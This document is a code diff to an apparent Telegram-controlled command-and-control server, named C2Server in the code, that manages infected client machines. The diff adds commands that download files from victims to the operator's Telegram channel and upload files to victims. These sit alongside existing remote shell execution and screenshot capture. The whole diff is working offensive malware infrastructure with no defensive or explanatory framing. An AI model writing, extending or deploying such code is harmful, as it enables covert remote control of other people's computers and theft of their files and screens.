@@ -116,6 +116,8 @@ class C2Server:
                 "- `/status` - Check if the client is online\n"
                 "- `/shell <command>` - Execute command in the client\n"
                 "- `/screenshot` - Take a screenshot and send it here\n"
+                "- `/download <file_path>` - Download a file from the client\n"
+                "- `/upload <file_path>` - Upload a file to the client\n"
             )
 
             bot.send_message(C2_CHANNEL_ID, f"ℹ️ *New client connected* ℹ️\n"
@@ -163,6 +165,14 @@ class C2Server:
         elif text == "/screenshot":
             self.send_command_to_client(self.clients[client_ip], "screenshot", message.message_thread_id)
 
+        elif text.startswith("/download"):
+            file = text.replace("/download ", "")
+            self.send_command_to_client(self.clients[client_ip], f"download {file}", message.message_thread_id)
+
+        elif text.startswith("/upload"):
+            bot.send_message(C2_CHANNEL_ID, "📁 File uploading...", message_thread_id=message.message_thread_id)
+            self.send_file(self.clients[client_ip], text.replace("/upload ", ""))
+
     def handle_global_command(self, message):
         text = message.text.lower()
 
@@ -198,11 +208,23 @@ class C2Server:
         for ip in to_remove:
             del self.clients[ip]
 
-
     def shutdown_server(self):
         bot.send_message(C2_CHANNEL_ID, "[!] Shutting down the sever...")
         import os, signal
         os.kill(os.getpid(), signal.SIGINT)
+
+    def send_file(self, client_socket, file):
+        try:
+            if os.path.exists(file):
+                with open(file, "rb") as f:
+                    content = f.read()
+                    encoded = base64.b64encode(content).decode("utf-8")
+                    encrypted = self.encrypt_message(f"[upload] {encoded}")
+            else:
+                encrypted = self.encrypt_message(f"[!] The file {file} does not exist.")
+            client_socket.socket.send(encrypted)
+        except Exception as e:
+            bot.send_message(C2_CHANNEL_ID, f"[!] Error sending the file: {e}")
 
     def sendall(self, text):
         command = text.replace("/sendall ", "")
@@ -255,20 +277,45 @@ class C2Server:
             response = self.decrypt_message(response.encode()).strip()
 
             if response.startswith("[screenshot]"):
-                image_data = response.replace("[screenshot]", "")
-                image_bytes = base64.b64decode(image_data)
+                self.recv_img(response, topic_id)
 
-                with open("screenshot.png", "wb") as f:
-                    f.write(image_bytes)
+            elif response.startswith("[download]"):
+                self.recv_file(response, topic_id)
 
-                with open("screenshot.png", "rb") as photo:
-                    bot.send_photo(C2_CHANNEL_ID, photo, caption="📸 Screenshot received", message_thread_id=topic_id)
+            elif response == "[File uploaded]":
+                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
+
+            elif response == "[Error uploading file]":
+                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
+
             else:
                 if len(response) > 4000:
                     response = response[:4000] + "\n[...truncated]"
                 bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
         except Exception as e:
             bot.send_message(C2_CHANNEL_ID, f"[!] Error executing the command: {e}", message_thread_id=topic_id)
+
+    def recv_file(self, response, topic_id):
+        file_data = response.replace("[download]", "")
+        file_bytes = base64.b64decode(file_data)
+
+        with open("downloaded_file", "wb") as f:
+            f.write(file_bytes)
+
+        with open("downloaded_file", "rb") as file:
+            bot.send_document(C2_CHANNEL_ID, file, caption="📁 File received", message_thread_id=topic_id)
+            os.remove("downloaded_file")
+
+    def recv_img(self, response, topic_id):
+        image_data = response.replace("[screenshot]", "")
+        image_bytes = base64.b64decode(image_data)
+
+        with open("screenshot.png", "wb") as f:
+            f.write(image_bytes)
+
+        with open("screenshot.png", "rb") as photo:
+            bot.send_photo(C2_CHANNEL_ID, photo, caption="📸 Screenshot received", message_thread_id=topic_id)
+            os.remove("screenshot.png")
 
     def recv_all(self, sock):
         size_data = b""
